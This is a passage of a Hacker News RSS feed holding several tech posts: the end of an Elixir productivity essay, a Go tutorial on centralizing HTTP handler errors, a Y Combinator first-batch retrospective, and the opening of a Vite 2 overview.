    case create_entity_with_attr(entity_attr) do
       {:ok, _entity} -&gt;
         all_errors
       {:error, err_msg} -&gt;
         [err_msg | all_errors]
    end
  end)
</code></pre>

<p>If the above looks like moon runes, it’s probably just because the syntax is new to your eyes.  After a week or so with the language, it reads very clearly.  Walking thru that snippet, we start with the second line:</p>

<ol>
<li>Create a date range between two dates (a range is essentially an entity with a start and end.)</li>
<li>Take that range and convert it into a linked list, filling in all the dates inbetween</li>
<li>Throw away about 25% of the dates, randomly</li>
<li>For each date, create a struct (map) which contains kv pairs of data, including the date.<br>

<ul>
<li>The output of this is a list of maps which gets passed on</li>
</ul></li>
<li>Take that list of maps and create defined structs.  Typically a <code>create_</code> prefix means you are creating and object and often storing it in some persistence layer.<br>

<ul>
<li>If no error occurred during the create statement, just pass along the error accumulator unmodified.</li>
<li>Any errors that do occure get prepended into the <code>all_errors</code> accumulator during the reduce operation.</li>
</ul></li>
<li>Finally we put the result of the reduce operation (any accumulated errors) and bind that to the <code>collected_errors</code> variable.</li>
</ol>

<h2>The endgame is high developer efficiency</h2>

<p>I’m very, very fond of go, but a typical implementation of equivalent functionality would typically be <strong>at least 5x longer and certainly more irritating to write.</strong></p>

<p>So, back to that macro experience of using Elixir:</p>

<ul>
<li>It’s quirky</li>
<li>There’s a learning curve</li>
<li>Taking the time to climb that curve can result in elegant solutions</li>
<li>The endgame is high developer efficiency</li>
</ul>

<p>That last bullet point, in my relatively short experience with Elixir, I’m fairly certain the overall developer productivity is quite high.  Likely in the top quartile or better of all development environments (possibly even top 10%).  There are <a href="https://smartlogic.io/podcast/elixir-wizards/s5e5-vo/">others who think so as well</a>.</p>

<p>The <em>combination</em> of the last two bullets is what I refer to as sublime efficiency in the title of this post.  This is a rare combination.  I believe go to be a great language for “IDE to prod” developer productivity, but I don’t believe it is a particularly elegant language.  Lisp and it’s variants can be quite elegant but you will run into feature velocity problems at some point (deployment, ecosystem, hiring…).</p>

<p>Developing in a modern functional language, with great safeguards (pattern matching, guards, type annotations, strong testing libraries, etc.) somehow allows developers to be efficient, write elegant code and also achieve high feature velocity.</p>

<p><a name="b2"></a>
It’s clearly not a perfect language or ecosystem.  The deployment story is not as good as go.<sup><a href="#2">2</a></sup></p>

<p>But it is one that I could see a lot of companies using as a competitive advantage with respect to time to market of getting product out.</p>

<p>All you have to do is get over the learning curve.</p>

<hr>

<p>Authors’s Note:</p>

<p>This post is the first of a two part series.  You can find the second part <a href="http://amattn.com/p/elixir_phoenix_the_business_case_for_liveview_strong_enough_to_change_how_you_staff_your_dev_team.html">here</a>.</p>

<ul>
<li><a href="https://amattn.com/p/the_sublime_developer_efficiency_of_elixir_phoenix_and_liveview_part_1.html">Part 1</a>: Elixir</li>
<li><a href="http://amattn.com/p/elixir_phoenix_the_business_case_for_liveview_strong_enough_to_change_how_you_staff_your_dev_team.html">Part 2</a>: Phoenix &amp; LiveView</li>
</ul>

<p>Lastly, I do live code streaming about Elixir, Phoenix, and LiveView on twitch.tv. You should follow me <a href="https://twitch.tv/amattn">there</a>.</p>

<hr>

<p>Footnotes:</p>

<ol>
<li><a name="1"></a>OCaml and F# have a similar operator and predate Elixir. The creator of Elixir himself thinks it <a href="https://elixirforum.com/t/which-language-first-introduced-the-pipe-operator/16791/8">came from F#</a>.<a href="#b1">↩</a></li>
<li><a name="2"></a>To be fair, no language ecosystem has a deployment story as good as go.  I would put elixir above any other dynamic language like python, ruby.  Being dependent on the erlang VM, it’s more like deploying a Java app (if you squint).  The tooling is <a href="https://amattn.com/p/deploying_elixir_phoenix_webapps_to_the_cloud_with_releases.html">there</a> and actively getting better.<a href="#b2">↩</a></li>
</ol>



<br>


<br>


<!-- The bottom of the page -->
	<br>
	
	
	<a href="" id="backup" name="bottom">back ⬆</a>



</div>]]>
            </description>
            <link>https://amattn.com/p/the_sublime_developer_efficiency_of_elixir_phoenix_and_liveview_part_1.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25780063</guid>
            <pubDate>Thu, 14 Jan 2021 18:25:20 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Elegance of Go's Error Handling]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25780009">thread link</a>) | @wagslane
<br/>
January 14, 2021 | https://thingsthatkeepmeupatnight.dev/posts/golang-http-handler-errors/ | <a href="https://web.archive.org/web/*/https://thingsthatkeepmeupatnight.dev/posts/golang-http-handler-errors/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
        
        <p>Every so often, go’s error handling pops up in various forums and everyone seems
to have an opinion about it. Some say they should be more like throwable
exceptions, others prefer sum types like rust’s <code>Result&lt;T, E&gt;</code>. While I’ve gone
with the sum type <a href="https://dev.to/duunitori/mimicing-rust-s-result-type-in-typescript-3pn1">approach in typescript</a>,
I still like the way go handles errors.</p>
<p>That said, figuring out how to <em>really</em> handle errors can take some time (with
or without sum types/exceptions). In this post, I’ll be walking through one
approach on handling errors in go’s <code>http.Handler</code>.</p>

<p>The error values can be frustrating if you expect them to scale out “just like
that” without repeating themselves. Usual example goes something like this:</p>
<div><pre><code data-lang="golang"><span>func</span> copyfile(src, dst) <span>error</span> {
	fsrc, err := os.Open(src)
	<span>if</span> err != <span>nil</span> {
		<span>return</span> err
	}
	<span>defer</span> fsrc.Close()

	fdst, err := os.Open(src)
	<span>if</span> err != <span>nil</span> {
		<span>return</span> err
	}
	<span>defer</span> fdst.Close()

	err := io.Copy(fdst, fsrc)

	<span>return</span> err
}
</code></pre></div><p>Thats not so bad, and I’m quite sure that most of you have seen example like
that before. But let’s take a look at similar situation that might occur in a
<code>http.Hanlder</code>:</p>
<div><pre><code data-lang="golang"><span>func</span> handleThing(w http.ResponseWriter, r *http.Request) {
	<span>// Our path is something like /thing/3
</span><span></span>	id, err := idFromPath(r.URL.Path)
	<span>if</span> err != <span>nil</span> {
		http.Error(w, http.StatusText(http.StatusBadRequest), http.StatusNotFound)
		<span>return</span>
	}

	thing, err := store.GetThingByID(id)
	<span>if</span> err != <span>nil</span> {
		<span>// The error might be sql.NoRows, or it might be something else.
</span><span></span>		<span>if</span> store.IsNotFoundErr(err) {
			http.Error(w, http.StatusText(http.StatusNotFound), http.StatusNotFound)
			<span>return</span>
		}
		log.Printf(<span>"Failed to get a thing: %v"</span>, err)
		http.Error(w, http.StatusText(http.StatusInternalServerError), http.StatusInternalServerError)
		<span>return</span>
	}

	acc := AccountFromRequest(r)
	<span>if</span> acc == <span>nil</span> {
		<span>// No account attached to the request's session -&gt; permission denied.
</span><span></span>		http.Error(w, http.StatusText(http.StatusForbidden), http.StatusForbidden)
		<span>return</span>
	}

	has, err := thing.HasPermissionToView(acc)
	<span>if</span> err != <span>nil</span> {
		<span>// For some reason, we failed to check permissions. Better log it.
</span><span></span>		log.Printf(<span>"Failed to check permissions: %v"</span>, err)
		http.Error(w, http.StatusText(http.StatusInternalServerError), http.StatusInternalServerError)
		<span>return</span>
	}

	<span>if</span> !has {
		<span>// Permission denied.
</span><span></span>		http.Error(w, http.StatusText(http.StatusForbidden), http.StatusForbidden)
		<span>return</span>
	}

	<span>// All good, send data to the client.
</span><span></span>	respond(w, r, decodeThing(thing))
}
</code></pre></div><p>Theres some functions that you’ll have to imagine is defined somewhere, but the
functionality is this:</p>
<ul>
<li>Extract ID from URL</li>
<li>Use that ID to get the thing from database</li>
<li>Check if the client has permission to view the thing</li>
<li>Give the thing to the client</li>
</ul>
<p>This functionality probably repeats itself for other resource types, so it gets
repetitive quite fast. Imagine doing the same for resources like foo, bar,
account and so on! Same functionality can be written in Django like this:</p>
<div><pre><code data-lang="python"><span>def</span> handle_thing(request):
    id = id_or_bad_request(request)
    thing = thing_or_404(id)

    account = account_or_forbidden(request)

    <span>if</span> <span>not</span> thing.has_permission(account):
        <span>raise</span> Forbidden()

    <span>return</span> JsonResponse(...)
</code></pre></div><p>Now that’s quite a lot simpler, thanks to throwable errors and how they
can be used to disrupt the code’s flow. <code>id_or_bad_request</code>, <code>thing_or_404</code> and
<code>account_or_forbidden</code> all throw an error that someone catches somewhere higher
and does the appropriate thing, like respond with correct status code and log
any errors.</p>

<p>Keeping that python code in mind, let’s think what we could do in our go code to
get it a bit more terse:</p>
<ul>
<li>When an error occurs, we just want to “throw” it somewhere. It usually is a
client error, but not always. Perhaps someone else can figure that out?</li>
<li>If a non client error occurs, it needs to be logged somewhere</li>
<li>Someone else should be able figure out the <code>http.Error</code> calls</li>
</ul>
<p>Golang’s <a href="https://blog.golang.org/error-handling-and-go">error handling and Go</a>
talks a bit about error handling in your http handlers and gives the following
example:</p>
<div><pre><code data-lang="golang"><span>func</span> viewRecord(w http.ResponseWriter, r *http.Request) <span>error</span> {
    c := appengine.NewContext(r)
    key := datastore.NewKey(c, <span>"Record"</span>, r.FormValue(<span>"id"</span>), 0, <span>nil</span>)
    record := new(Record)
    <span>if</span> err := datastore.Get(c, key, record); err != <span>nil</span> {
        <span>return</span> err
    }
    <span>return</span> viewTemplate.Execute(w, record)
}

<span>// NOTE: the following is my adapted version from the example's ServeHTTP to a
</span><span>// middleware/wrapper
</span><span></span>
<span>type</span> HandlerE = <span>func</span>(w http.ResponseWriter, r *http.Request) <span>error</span>

<span>func</span> WithError(h HandlerE) http.HandlerFunc {
	<span>return</span> <span>func</span>(w http.ResponseWriter, r *http.Request) {
		<span>if</span> err := h(w, r); err != <span>nil</span> {
			http.Error(w, err.Error(), 500)
		}
	}
}
</code></pre></div><p>That already solves one of our problems, which is the <code>http.Error</code> call. But
sometimes we don’t want to expose detailed errors to the client, so I would
replace the actual message with just a generic internal server error message.
Also, logging the reasons for internal server errors is important, so that you
can figure out what went wrong.</p>

<p>We want to return an error from our <em>actual</em> <code>http.Handler</code>, but somehow
instruct the <code>WithError</code> wrapper function to respond correctly to the client
when it gets an error, and on some errors log the errors. Something like this:</p>
<div><pre><code data-lang="golang"><span>func</span> WithError(h HandlerE) http.HandlerFunc {
	<span>return</span> <span>func</span>(w http.ResponseWriter, r *http.Request) {
		<span>if</span> err := h(w, r); err != <span>nil</span> {

			<span>if</span> is404err(err) {
				http.Error(w, <span>"not found"</span>, 404)
				<span>return</span>
			}

			<span>if</span> isBadRequest(err) {
				http.Error(w, <span>"bad request"</span>, 400)
				<span>return</span>
			}

			<span>// Some other special cases...
</span><span></span>			<span>// ...
</span><span></span>
			log.Printf(<span>"Something went wrong: %v"</span>, err)

			http.Error(w, <span>"Internal server error"</span>, 500)
		}
	}
}
</code></pre></div><p>Hmm, those “other special” cases might come and go and might get quite specific
for some handlers. Also, we’d still need to write those <code>is404err</code> and
<code>isBadRequest</code> handlers and whatever will follow. We can do much better with an
interface:</p>
<div><pre><code data-lang="golang"><span>type</span> ErrorResponder <span>interface</span> {
    <span>// RespondError writes an error message to w. If it doesn't know what to
</span><span></span>    <span>// respond, it returns false.
</span><span></span>	RespondError(w http.ResponseWriter, r *http.Request) <span>bool</span>
}
</code></pre></div><p>With this interface we can do quite powerful things. Our <code>WithError</code> turns into
this:</p>
<div><pre><code data-lang="fallback">
func WithError(h HandlerE) http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		if err := h(w, r); err != nil {
			if er, ok := err.(ErrorResponder); ok {
				if er.RespondError(w, r) {
					return
				}
			}

			log.Printf("Something went wrong: %v", err)

			http.Error(w, "Internal server error", 500)
		}
	}
}
</code></pre></div><p>Notice how our special cases just disappeared? They are now just another
implementation(s) of <code>ErrorResponder</code>. This is what would our <code>Not found</code> and <code>Bad request</code> errors now looks like:</p>
<div><pre><code data-lang="golang">
<span>// BadRequest error responds with bad request status code, and optionally with
</span><span>// a json body.
</span><span></span><span>type</span> BadRequestError <span>struct</span> {
	err  <span>error</span>
	body <span>interface</span>{}
}

<span>func</span> BadRequest(err <span>error</span>) *BadRequestError {
	<span>return</span> &amp;BadRequestError{err: err}
}

<span>func</span> BadRequestWithBody(body <span>interface</span>{}) *BadRequestError {
	<span>return</span> &amp;BadRequestError{body: body}
}

<span>func</span> (e *BadRequestError) RespondError(w http.ResponseWriter, r *http.Request) <span>bool</span> {
	<span>if</span> e.body == <span>nil</span> {
		http.Error(w, http.StatusText(http.StatusBadRequest), http.StatusBadRequest)
	} <span>else</span> {
		w.WriteHeader(http.StatusBadRequest)

		w.Header().Set(<span>"Content-Type"</span>, <span>"application/json"</span>)
		err := json.NewEncoder(w).Encode(e.body)

		<span>if</span> err != <span>nil</span> {
			log.Printf(<span>"Failed to encode a response: %v"</span>, err)
		}
	}

	<span>return</span> <span>true</span>
}

<span>func</span> (e *BadRequestError) Error() <span>string</span> {
	<span>return</span> e.err.Error()
}

<span>// Maybe404Error responds with not found status code, if its supplied error
</span><span>// is sql.ErrNoRows.
</span><span></span><span>type</span> Maybe404Error <span>struct</span> {
	err <span>error</span>
}

<span>func</span> Maybe404(err <span>error</span>) *Maybe404Error {
	<span>return</span> &amp;Maybe404Error{err: err}
}

<span>func</span> (e *Maybe404Error) Error() <span>string</span> {
	<span>return</span> fmt.Sprintf(<span>"Maybe404: %v"</span>, e.err.Error())
}

<span>func</span> (e *Maybe404Error) Is404() <span>bool</span> {
	<span>return</span> errors.Is(e.err, sql.ErrNoRows)
}

<span>func</span> (e *Maybe404Error) RespondError(w http.ResponseWriter, r *http.Request) <span>bool</span> {
	<span>if</span> !e.Is404() {
		<span>return</span> <span>false</span>
	}

	http.Error(w, http.StatusText(http.StatusNotFound), http.StatusNotFound)
	<span>return</span> <span>true</span>
}
</code></pre></div><p>You could easily write more <code>ErrorResponder</code>s for permission denied errors and
much more.</p>

<p>With <code>ErrorResponder</code> and <code>WithError</code>, we can reduce our earlier <code>handleThing</code>
handler into this:</p>
<div><pre><code data-lang="golang"><span>func</span> handleThing(w http.ResponseWriter, r *http.Request) <span>error</span> {
	<span>// Our path is something like /thing/3
</span><span></span>	id, err := idFromPath(r.URL.Path)
	<span>if</span> err != <span>nil</span> {
		<span>// Literally bad request. We could use BadRequestWithBody to
</span><span></span>		<span>// respond with a fancy information for the client.
</span><span></span>		<span>return</span> BadRequest(err)
	}

	thing, err := store.GetThingByID(id)
	<span>if</span> err != <span>nil</span> {
		<span>// Likely a not found issue, but something else might have gone wrong.
</span><span></span>		<span>// Maybe404Error handles both cases.
</span><span></span>		<span>return</span> Maybe404(err)
	}

	acc := AccountFromRequest(r)
	<span>if</span> acc == <span>nil</span> {
		<span>// No account attached to the request. Client needs to authenticate.
</span><span></span>		<span>return</span> AuthenticationRequired()
	}

	has, err := thing.HasPermissionToView(acc)
	<span>if</span> err != <span>nil</span> {
		<span>// Something actually went wrong. Error will be logged and 500 message
</span><span></span>		<span>// sent to the client.
</span><span></span>		<span>return</span> err
	}

	<span>if</span> !has {
		<span>// Client doesn't have permission to view this resource.
</span><span></span>		<span>return</span> PermissionDenied()
	}

	<span>// All good, send data to the client.
</span><span></span>	respond(w, r, decodeThing(thing))
}

<span>func</span> main() {
	...
	mux.Handle(<span>"/thing/"</span>, WithError(handleThing))
	...
}
</code></pre></div><p>Thats a lot better! I’ll leave it as an exercise to the reader to combine the
auth and permission checking. Another exercise is to do a bit better logging
than just “Something went wrong: <em>error</em>” in the WithError function. Perhaps log
the path and requester, or use trace ids?</p>
<p>With all this, we can now:</p>
<ul>
<li>“throw” errors somewhere</li>
<li>Someone else is figuring out the <code>http.Error</code> calls</li>
<li>Non client errors are logged</li>
</ul>

<p>Sometimes I’m amazed just by how simple (yet powerful) go’s error type is. Other
times I’m banging my head against the wall because I can’t figure out how to use
that simplicity. The solution presented in …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://thingsthatkeepmeupatnight.dev/posts/golang-http-handler-errors/">https://thingsthatkeepmeupatnight.dev/posts/golang-http-handler-errors/</a></em></p>]]>
            </description>
            <link>https://thingsthatkeepmeupatnight.dev/posts/golang-http-handler-errors/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25780009</guid>
            <pubDate>Thu, 14 Jan 2021 18:22:12 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Y Combinator’s First Batch: Where are they now?]]>
            </title>
            <description>
<![CDATA[
Score 13 | Comments 3 (<a href="https://news.ycombinator.com/item?id=25779621">thread link</a>) | @smalera
<br/>
January 14, 2021 | https://www.businessofbusiness.com/articles/y-combinator-where-are-they-now-first-batch-reddit-twitch/ | <a href="https://web.archive.org/web/*/https://www.businessofbusiness.com/articles/y-combinator-where-are-they-now-first-batch-reddit-twitch/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="main-section">
    <!-- .sidebar -->

    <section>
      
      

      <p><span>When Paul Graham and Jessica Livingston first began accepting applications for their new startup accelerator, they had $200,000 in seed money and four employees.</span></p>
<p><span>Graham, who had been working at a web application company called Viaweb, wasn’t particularly confident that their new venture would do well. But Graham wanted to invest in promising college students building innovative tech startups, much like his mentor, lawyer Julian Weber, had invested $10,000 in Graham’s own Viaweb.&nbsp;</span></p>
<p><span>Despite their misgivings, Graham and Livingston plowed ahead, creating a Silicon Valley icon in the process. To date, Y Combinator has helped launch and fund over 2,000 startups in Silicon Valley, including giants like Airbnb, Dropbox, Stripe, Reddit, DoorDash, Coinbase, and many more. As of 2021, the combined value of YC’s startups is estimated at $300 billion. Today, founders still aspire to get into one of YC’s batches.&nbsp;</span></p>
<p><span>Y Combinator’s consistently successful 16-year run all started with that First Batch, which included founders like Alexis Ohanian, Steve Huffman, Sam Altman, and Justin Kan. Last week, Kan </span><a href="https://twitter.com/justinkan/status/1337122637483364354?s=20"><span>tweeted an image</span></a><span> of YC’s First Batch dating back to the summer of 2005. It’s worth seeing how the years have treated that very first batch.</span></p>
<h2><b>2. Zak Stone</b></h2>
<p><b><img alt="" height="393" src="https://static.media.thinknum.com/media/uploads/.thumbnails/zak_stone.jpg/zak_stone-700x393.jpg" width="700"><span></span></b></p>
<p><b>Co-founder, Memamp<br></b><b>Where is he now?<br></b><b>Product manager for Cloud TPUs, Google</b></p>
<p><span>Along with Chris Slowe, Zak Stone co-founded Memamp, a desktop search startup. The two had been working on their idea for about a year before being accepted into Y Combinator’s First Batch, but it wasn’t meant to be. That summer, Google released its own desktop search feature, and Apple announced its Spotlight search feature for Macs. While Stone and Slowe decided to scrap the idea, Slowe joined up with Reddit’s founders. Stone, meanwhile, now works for Google’s Brain Team as a product manager for Cloud TPUs.</span></p>
<h2><span>3. Steve Huffman<br></span><span>4. Alexis Ohanian<br></span><span>6. Chris Slowe<br></span><span>10. Aaron Swartz</span></h2>
<p><span><img alt="" height="393" src="https://static.media.thinknum.com/media/uploads/.thumbnails/reddit.jpg/reddit-700x393.jpg" width="700"><span></span></span></p>
<p><b>Founders, Reddit<br></b><b>Where are they now?<br></b><b>Ohanian: Entrepreneur, investor<br></b><b>Huffman: CEO, Reddit<br></b><b>Slowe: CTO, Reddit<br></b><b>Swartz: Committed suicide in 2013 at age 26.</b></p>
<p>After the initial rejection of their first startup idea, MyMobileMenu, Alexis Ohanian and his fellow founders started work on “the front page of the internet.” That project,&nbsp;an idea that came from Paul Graham,&nbsp;turned into Reddit, one of Y Combinator’s most successful startups. When it was bought by Condé Nast in 2006, Ohanian was suddenly a multi-millionaire and one of Silicon Valley’s most revered founders, all by age 23. Since co-founding Reddit, Ohanian has founded several other startups and venture capital firms, including Breadpig, Hipmunk, Das Kapital Capital, and Initialized Capital. His wife, tennis superstar Serena Williams, also founded her own VC firm, Serena Ventures.&nbsp;</p>
<p><span>Steve Huffman, Reddit’s second co-founder, served as CEO of the company until 2009, then returned to the role in 2015. Although Huffman and Ohanian sold Reddit for $10 million to $20 million, Huffman later said that he regretted the decision, not realizing how popular the site would become. As of 2019, the company was worth $3 billion. Huffman went on to co-found Hipmunk, a travel search site, before returning to the startup that started it all.</span></p>
<p><span>Chris Slowe is still with Reddit as its CTO (and is a former CEO), but spent some years away from the company before returning in 2015. Slowe also worked for Hipmunk as chief scientist, citing the desire for change as his main reason for leaving Reddit.</span></p>
<p><span>Reddit’s fourth co-founder, Aaron Swartz, arrived late to the party when his own startup, Infogami, merged with the company. Later on, Swartz devoted his time to a number of social causes, helping launch the Progressive Change Campaign Committee to support online activism. He also founded the online group Demand Progress which led a campaign against the Stop Online Piracy Act in 2010.&nbsp;</span></p>
<p><span>In 2011, Swartz was arrested on breaking-and-entering charges on the MIT campus after illegally downloading academic articles from a university database. He was charged in federal court with two counts of wire fraud, among other charges, and faced 35 years in prison. Days after a rejected plea bargain and counter offer to minimize his sentence, Swartz was found dead in his Brooklyn apartment by apparent suicide. He was 26 years old.</span></p>
<h2><b>5. Emmett Shear<br></b><b><b>11. Justin Kan</b></b></h2>
<p><b><b><img alt="" height="420" src="https://static.media.thinknum.com/media/uploads/.thumbnails/justin_kan_emmett_shear.jpg/justin_kan_emmett_shear-700x420.jpg" width="700"><span></span></b></b></p>
<p><b>Founders, Kiko<br></b><b><b>Where are they now?<br></b></b><b><b>Shear: CEO, Twitch<br></b></b><b><b>Kan: CEO of shuttered startup Atrium</b></b></p>
<p><span>Justin Kan and Emmett Shear have found massive success since first signing up for Y Combinator’s first class. The founders sold their online calendar startup, Kiko, a year after graduating YC, when they realized the new Google Calendar would eclipse their own startup. Kan and Shear went on to found Justin.tv, a livestream site that Kan himself used to document his daily life for eight months. The two then founded livestream gaming site Twitch as a spin-off of Justin.tv, which has grown into a $15 billion business.&nbsp;</span></p>
<h2><span>8. Philip Yuen</span></h2>
<h3><strong><img alt="" height="420" src="https://static.media.thinknum.com/media/uploads/.thumbnails/philip_yuen-2.jpg/philip_yuen-2-700x420.jpg" width="700"><span></span></strong></h3>
<h3><strong>Founder, TextPayMe<br>Where is he now?<br>CEO, Aurabeat Technology</strong></h3>
<h2><b><b>13. Mikhail Ledvich</b></b></h2>
<p><b><b><img alt="" height="420" src="https://static.media.thinknum.com/media/uploads/.thumbnails/mikhail_ledvich-2.jpg/mikhail_ledvich-2-700x420.jpg" width="700"><span></span></b></b></p>
<p><b>Founders, Clickfacts<br></b><b>Where is he now?<br></b><b></b><strong>VP, Senior Digital Product Consultant, Bank of America</strong></p>
<p><span>Clickfacts, one of the lesser known startups to come out of Y Combinator, was a malware software solutions company. After YC, its co-founders continued running their startup until its demise sometime after 2012. Although it didn’t generate much buzz while it was up and running, Clickfacts became the longest running startup from YC’s First Batch not to be acquired. Mikhail Ledvich, who was also a product architect at Clickfacts, today works for Bank of America as a VP and senior digital product consultant.</span></p>
<h2><b>14. Sam Altman<br></b><b><b>Not pictured: Nick Sivo&nbsp;</b></b></h2>
<p><b><b><img alt="" height="420" src="https://static.media.thinknum.com/media/uploads/.thumbnails/sam_altman_nick_sivo.jpg/sam_altman_nick_sivo-700x420.jpg" width="700"><span></span></b></b></p>
<p><b>Founders, Loopt<br></b><b>Where are they now?<br></b><b>Altman: CEO, OpenAI<br></b><b>Sivo: Runs YC Hacker News</b></p>
<p><span>After Loopt failed to gain traction in the years following its run with Y Combinator, Sam Altman and Nick Sivo sold their startup in 2012. Since then, Altman has kept close ties with YC, first becoming a part-time partner, then president of the startup accelerator in 2014. Altman is also CEO of OpenAI, an artificial intelligence research startup he co-founded with Elon Musk. Nick Sivo has also spent his post-Loopt years at Y Combinator, maintaining their Hacker News site, though he’s largely stayed out of the public eye.</span></p>
<h2><b><b>15. Jesse Tov</b></b></h2>
<p><b><b><img alt="" height="420" src="https://static.media.thinknum.com/media/uploads/.thumbnails/jesse_tov-2.jpg/jesse_tov-2-700x420.jpg" width="700"><span></span></b></b></p>
<p><b>Founder, Simmery Axe<br></b><b>Where is he now?<br></b><b></b><strong>Computer Science Professor at Northwestern University</strong></p>
<p><span>Like some of the other startups to come from Y Combinator’s First Batch, Simmary Axe shut down not long after the summer program ended. Its founder, Jesse Tov, hasn’t spent much time as an entrepreneur since, trading the startup life for academia. He now teaches computer science at Northwestern University. Before teaching, Tov spent time with the U.S. Navy Fleet Numerical Meteorology and Oceanography Center.</span></p>
<h2><b>1. Jessica Livingston<br></b><b>16. <b>Paul Graham</b></b></h2>
<p><b><b><img alt="" height="393" src="https://static.media.thinknum.com/media/uploads/.thumbnails/jessica-livingston-and-paul-graham.jpg/jessica-livingston-and-paul-graham-700x393.jpg" width="700"><span></span></b></b></p>
<p><b>Founders, Y Combinator<br></b><b>Where are they now?<br></b><b>Both Graham and Livingston still run Y Combinator.</b></p>
<p><span>As for Paul Graham and Jessica Livingston, the husband and wife duo&nbsp;have ceased running the startup accelerator day to day, and now have&nbsp;a full-time staff. Graham, who stepped down in 2014, has been called a “startup guru” for the major companies&nbsp;that have come out of YC. In recent years, Graham has authored numerous essays on startups and company growth, becoming one of the greatest minds behind Silicon Valley in the process.&nbsp;</span></p>
<p><span>Livingston also had a hands-on role in the early days of Y Combinator. Before getting married in 2008, Graham and Livingston were dating while running YC, and according to Graham, the program felt like a family. Today, Livingston is on sabbatical, but lives with Graham and their two children in England.</span></p>
<p><em>Note: the names of&nbsp;founders 7, 9, and 12 aren't known, and their startups aren't listed on the <a href="https://www.ycombinator.com/companies/?batch=S05">Y Combinator page</a> for the First Batch.</em></p>
      

      

      



    </section><!-- .article-body -->

    
  </div></div>]]>
            </description>
            <link>https://www.businessofbusiness.com/articles/y-combinator-where-are-they-now-first-batch-reddit-twitch/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25779621</guid>
            <pubDate>Thu, 14 Jan 2021 17:56:35 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Vite 2, a DX jump into the future]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25779588">thread link</a>) | @marianabeldi
<br/>
January 14, 2021 | https://patak.dev/web/vite-2.html | <a href="https://web.archive.org/web/*/https://patak.dev/web/vite-2.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-v-6204d012=""><div data-v-6204d012=""><p><a href="https://github.com/vitejs" target="_blank" rel="noopener noreferrer">Vite</a> is a next-generation frontend tool. It generates optimized builds using the battle-tested bundler <a href="https://rollupjs.org/" target="_blank" rel="noopener noreferrer">rollup</a>. But during dev, bundling is avoided with files served on-demand over native ESM. It has Hot Module Replacement (HMR) that stays fast independently of your codebase size.</p><p>This post discusses why the instant feedback loop unlocked by Vite is so important and what is new in the next iteration of Vite, which is currently in beta. Be sure to check out <a href="https://vitejs.dev/" target="_blank" rel="noopener noreferrer">the new Vite docs site</a>, built with <a href="https://vitepress.vuejs.org/" target="_blank" rel="noopener noreferrer">VitePress</a>.</p><ul><li><a href="#frontend-tooling-is-evolving">Frontend tooling is evolving</a></li><li><a href="#powered-by-vitepress">Powered by VitePress</a></li><li><a href="#what-is-new-in-vite-2">What is new in Vite 2</a><ul><li><a href="#vite-docs">Vite docs</a></li><li><a href="#framework-agnostic-core">Framework agnostic core</a></li><li><a href="#universal-plugin-format">Universal plugin format</a></li><li><a href="#error-overlay">Error Overlay</a></li><li><a href="#lib-mode">Lib Mode</a></li><li><a href="#multi-entry-mode">Multi entry mode</a></li><li><a href="#strong-caching-of-npm-deps">Strong caching of npm deps</a></li><li><a href="#other-highlights">Other Highlights</a></li></ul></li><li><a href="#feeling-the-speed">Feeling the speed</a></li><li><a href="#an-immediate-connection">An immediate connection</a></li></ul><p><a href="https://github.com/vitejs/vite" target="_blank" rel="noopener noreferrer">Vite</a>'s novel approach to web dev tooling, <a href="https://vitejs.dev/guide/comparisons.html" target="_blank" rel="noopener noreferrer">together</a> with <a href="https://modern-web.dev/docs/dev-server/overview/" target="_blank" rel="noopener noreferrer">@web/dev-server</a> and <a href="https://www.snowpack.dev/" target="_blank" rel="noopener noreferrer">Snowpack</a>, paved the way to a renaissance in dev tools exploration. Removing bundling during dev through JIT transpilations of files in a dedicated server allowed these projects to offer an incredible fast feedback loop while developing without losing the state of art optimizations like bundling and minification for production builds.</p><p>The release of <a href="https://github.com/preactjs/wmr" target="_blank" rel="noopener noreferrer">WMR</a> from the Preact team solidified this path and brought new ideas to the table. In particular, their universal plugin format based on rollup plugins let them and other devs share the same transform code in dev and build time. Vite 2 continues this exploration, incorporating what is proving to work well in Snowpack and WMR and taking the opportunity to apply what has been learned in the past months.</p><p>All of these tools are framework agnostic, you can use Vite to develop React with fast refresh for example. But, interestingly, the teams behind Vue, Preact, and Svelte are at the forefront of this new generation of dev tools. Vite is being developed by <a href="https://twitter.com/youyuxi" target="_blank" rel="noopener noreferrer">Evan You</a> and the Vue community, WMR is an effort from the Preact ecosystem and the Svelte guild will surely get more involved in Snowpack dev now that they have chosen it for <a href="https://svelte.dev/blog/whats-the-deal-with-sveltekit" target="_blank" rel="noopener noreferrer">Svelte Kit</a>. I think this marks an inflection point for UI frameworks, and we will see a lot of innovation in DX, SSR, and SSG in the future.</p><h2 id="powered-by-vitepress"> Powered by VitePress</h2><p><a href="https://patak.dev/" target="_blank" rel="noopener noreferrer">This page</a> is built using <a href="https://vitepress.vuejs.org/" target="_blank" rel="noopener noreferrer">VitepPress</a>, which now uses Vite 2. It is a great way to experience the developing flow that Vite unlocks. VitePress is a Vue-powered static site generator that is pushing the boundaries in both DX and performance. Because of the use of templates in Vue, static blocks can be detected to avoid hydration penalties. Dynamic Vue components can still be interleaved in markdown.</p><p>The post is converted into a vue component so the composition API can be used to add reactive state to your documents. Components can also be imported and used in the markdown. VitePress is still able to identify the static parts of the post and only include the minimal code needed to hydrate the dynamic blocks.</p><div><pre><code><span><span><span>&lt;</span>script</span> <span>setup</span><span>&gt;</span></span><span><span>
<span>import</span> FiltersPlayground <span>from</span> <span>'./FiltersPlayground.vue'</span>
</span></span><span><span><span>&lt;/</span>script</span><span>&gt;</span></span>

<span><span>#</span> CSS Filters Playground</span>

Use the component in your markdown docs
